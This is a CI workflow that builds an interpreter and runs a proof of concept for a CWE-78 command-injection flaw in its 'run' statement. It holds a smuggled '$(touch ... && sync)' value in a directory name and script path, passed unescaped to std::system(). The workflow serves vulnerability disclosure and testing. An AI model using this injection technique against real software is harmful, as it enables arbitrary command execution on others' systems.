name: CI

on:
  push:
    branches: [ "**" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build interpreter
        run: |
          cmake -S interpreter -B /tmp/msla-build
          cmake --build /tmp/msla-build -j$(nproc)

      - name: Verify build
        run: |
          file /tmp/msla-build/msla_interpreter
          /tmp/msla-build/msla_interpreter /dev/null 2>&1 && true
          echo "Build OK"

  command-injection-poc:
    if: always()
    runs-on: ubuntu-latest
    needs: build
    steps:
      - uses: actions/checkout@v4

      - name: Build interpreter
        run: |
          cmake -S interpreter -B /tmp/msla-build
          cmake --build /tmp/msla-build -j$(nproc)

      - name: Create trap directory (literal $() name bypasses fs::exists)
        run: mkdir -p '/tmp/$(touch /tmp/msla_poc_flag && sync)'

      - name: Create PoC script
        run: |
          cat > /tmp/poc.msla << 'POCEOF'
          run "/tmp/$(touch /tmp/msla_poc_flag && sync)"
          POCEOF

      - name: Run PoC - reproduce CWE-78 command injection
        shell: bash
        run: |
          # system() uses clone3(CLONE_VFORK), and background & causes
          # $(cmd) to run in a child process AFTER system() returns.
          # We poll for the flag file with a timeout.
          rm -f /tmp/msla_poc_flag

          set +e
          /tmp/msla-build/msla_interpreter /tmp/poc.msla 2>&1
          exit_code=$?
          set -e

          echo ""
          echo "============================================"
          echo "  CWE-78 PoC - OS Command Injection"
          echo "============================================"

          # Poll for flag file (background command race)
          found=0
          for i in $(seq 1 15); do
            if [ -f /tmp/msla_poc_flag ]; then
              found=1
              break
            fi
            sleep 1
          done

          echo ""

          if [ "$found" = "1" ]; then
            echo "  ✅ VULNERABILITY CONFIRMED"
            echo "     Command injection via 'run' statement"
            echo "     Flag file created: $(cat /tmp/msla_poc_flag || echo 'exists')"
            echo ""
            echo "  Attack chain:"
            echo "    1. run \"<path>\" passes user-controlled path to std::system()"
            echo "    2. path = /tmp/\$(touch /tmp/flag && sync)"
            echo "    3. fs::exists() checks literal path on disk (bypassed via mkdir)"
            echo "    4. Shell expands \$(...) as command substitution"
            echo "    5. Arbitrary command executes inside interpreter process"
            echo ""
            echo "  Location: interpreter/interpreter.cpp:670-671"
            echo "  Fix:      use execv() or validate path with strict allowlist"
          else
            echo "  ❌ NOT REPRODUCED"
            echo "     Expected flag file /tmp/msla_poc_flag to exist, but not found"
            echo "     interpreter exited with code $exit_code"
            exit 1
          fi
